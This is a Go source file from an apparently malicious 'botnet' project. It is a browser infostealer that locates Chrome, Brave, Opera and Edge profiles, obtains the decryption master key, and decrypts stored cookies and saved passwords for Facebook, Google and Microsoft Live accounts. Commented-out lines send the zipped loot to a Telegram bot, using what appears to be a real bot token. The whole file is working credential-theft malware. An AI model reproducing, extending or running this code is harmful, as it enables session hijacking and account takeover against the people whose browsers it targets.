package internal

import (
	_const "botnetgolang/internal/const"
	"botnetgolang/internal/model"
	"botnetgolang/internal/pkg"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"
)

const (
	Cfff = ".facebook.com"
	Cggg = "google.com"
	Clll = "live.com"
)

var jsonData []interface{}

func FunGetProfile(browser model.BrowserPaths) *model.AllProfile {
	var result model.AllProfile

	ppp := os.Getenv("APPDATA")
	if ppp == "" {
		ppp = os.Getenv("HOME")
	}
	part := strings.Split(ppp, "\\AppData")
	ppp = part[0]

	jsonData = append(jsonData, filepath.Join(ppp, "fffff"))

	pathfolderD := filepath.Join(ppp, browser.Pa)

	textF := "108.0.0.0"
	alls := make([]string, 0)

	// Use os.Stat() to check if the folder exists
	_, err := os.Stat(pathfolderD)

	if err == nil {
		if browser.Name == model.GetOperaDefaultPaths().Name {
			alls = append(alls, pathfolderD)
		} else {
			content, err := ioutil.ReadFile(filepath.Join(pathfolderD, "Last Version"))
			if err == nil {
				textF = string(content)
			}

			if paths, err := pkg.GetDirectoriesV2(pathfolderD); err != nil {
				fmt.Print("loi")
			} else {
				for _, value := range paths {
					alls = append(alls, value)
				}

			}
		}
	}

	//if err != nil {
	//	return
	//}
	// lay cac profile
	result.Alls = alls
	result.PathSource = ppp
	result.UserData = pathfolderD
	result.Version = textF

	return &result
}

func MainBL(browser model.BrowserPaths, path string) {
	allProfile := FunGetProfile(browser)

	pathbrowser := path + `\` + browser.Name
	err := os.Mkdir(pathbrowser, os.ModePerm)
	if err != nil {
		fmt.Println(err)
		return
	}

	if len(allProfile.Alls) < 0 {
		return
	}

	masterKey, err := pkg.GetMasterKey(allProfile.PathSource + browser.Local)
	fmt.Println(masterKey)
	if err != nil {
		fmt.Println("error cant get masterKey")
	}
	cookie_ok := make([]*model.Cookie, 0)
	info_ok := make([]*model.Info, 0)
	cookie_ok_fb := make([]*model.Cookie, 0)
	var pass_model model.KeyInfo

	for _, profile := range allProfile.Alls {
		path := fmt.Sprintf("%v\\Network\\Cookies", profile)
		// connect sqlite3
		connToken, err := pkg.ConnectSQLite(path)
		if err != nil {
			fmt.Println(err)
		}
		fmt.Println(connToken)

		// cookies get all,      == datas2
		cookies, _ := pkg.QueryData(connToken, pkg.CookiesSQL) // datas2

		// islogin

		var is_login []map[string]interface{}

		for _, row := range cookies {
			if row["name"].(string) == "xs" && strings.Contains(row["host_key"].(string), _const.Cfff) {
				is_login = append(is_login, row)
			}
		}

		//
		if len(is_login) > 0 {
			// data_cookies_is_login get info after is_login     == datas

			cookie_ok = make([]*model.Cookie, 0)
			cookie_ok_fb = make([]*model.Cookie, 0)

			var data_cookies_is_login []map[string]interface{} //datas

			for _, row := range cookies {
				if strings.Contains(row["host_key"].(string), _const.Cfff) || strings.Contains(row["host_key"].(string), _const.Cggg) || strings.Contains(row["host_key"].(string), _const.Clll) {
					data_cookies_is_login = append(data_cookies_is_login, row)
				}
			}

			// get to readable cookie after checking login
			for _, value := range data_cookies_is_login { // datas
				tmp := value["is_httponly"]
				fmt.Println(tmp)
				tokenRow := &model.Cookie{
					Domain:         value["host_key"].(string),
					ExpirationDate: float64(value["expires_utc"].(int64)) / 1000000,
					HttpOnly:       value["is_httponly"],
					Name:           value["name"].(string),
					Path:           value["path"].(string),
					Secure:         value["is_secure"],
					Value:          value["encrypted_value"].(string),
				}
				result_cookie := pkg.GetCookie(tokenRow, allProfile.PathSource+browser.Local, masterKey) // allCookies
				if result_cookie != nil {
					cookie_ok = append(cookie_ok, result_cookie)
				}
			}

			// get cookie fb ok
			for _, row := range cookie_ok {
				if strings.Contains(row.Domain, _const.Cfff) {
					cookie_ok_fb = append(cookie_ok_fb, row)
				}
			}

			// get info
			path = fmt.Sprintf("%v\\Login Data", profile)
			connInfo, _ := pkg.ConnectSQLite(path)
			info, _ := pkg.QueryData(connInfo, pkg.Passwords)

			// get info contain face, google, live
			var list_info_pass []map[string]interface{} // arrscookieFB
			for _, row := range info {
				if strings.Contains(row["action_url"].(string), _const.Cfff) || strings.Contains(row["action_url"].(string), _const.Cggg) || strings.Contains(row["action_url"].(string), _const.Clll) {
					list_info_pass = append(list_info_pass, row)
				}
			}

			profiletmp := strings.Split(profile, "\\")
			for _, value := range list_info_pass {

				infoRow := &model.Info{
					Url:      value["action_url"].(string),
					UserName: value["username_value"].(string),
					Pass:     value["password_value"].(string),
					Browser:  browser.Name,
					Profile:  profiletmp[len(profiletmp)-1],
				}
				result := pkg.GetInfo(infoRow, allProfile.PathSource+browser.Local, masterKey)

				if strings.Contains(value["action_url"].(string), _const.Cfff) {
					pass_model.Facebook = infoRow.Pass
				} else if strings.Contains(value["action_url"].(string), _const.Cggg) {
					pass_model.UserGmail = infoRow.UserName
					pass_model.Facebook = infoRow.Pass
				} else if strings.Contains(value["action_url"].(string), _const.Clll) {
					pass_model.UserGmail = infoRow.UserName
					pass_model.Facebook = infoRow.Pass
				}
				if result != nil {
					info_ok = append(info_ok, result)
				}
				fmt.Println(result)
			}

			pkg.GetToken(profile, cookie_ok_fb, cookie_ok, pass_model, allProfile.Version, browser, pathbrowser)
		}

	}

	//pkg.SnapImage()
	//file_cookie, err := os.Create(pathbrowser + `/` + "cookie.json")
	//defer func() {
	//	if err := file_cookie.Close(); err != nil {
	//		panic(err)
	//	}
	//}()
	//file_pass, err := os.Create("./storage/pass.json")
	//defer func() {
	//	if err := file_pass.Close(); err != nil {
	//		panic(err)
	//	}
	//}()

	//encoder_cookie := json.NewEncoder(file_cookie)
	//err = encoder_cookie.Encode(cookie_ok)
	//
	//encoder_pass := json.NewEncoder(file_pass)
	//err = encoder_pass.Encode(info_ok)

	pkg.GetInfoOperatingSystem()

	//token := "6044700730:AAFR9FNJETE62Kmt1oSyNYuhKlwf1RhmOQE"
	//pkg.SendFileByBotTele(token, "storage.zip")
	//fmt.Println(test)

}

func Run() {
	MainBL(model.GetChromePaths(), "storage")
	MainBL(model.GetBravePaths(), "storage")
	MainBL(model.GetOperaGXPaths(), "storage")
	MainBL(model.GetOperaDefaultPaths(), "storage")
	MainBL(model.GetEdgePaths(), "storage")

}
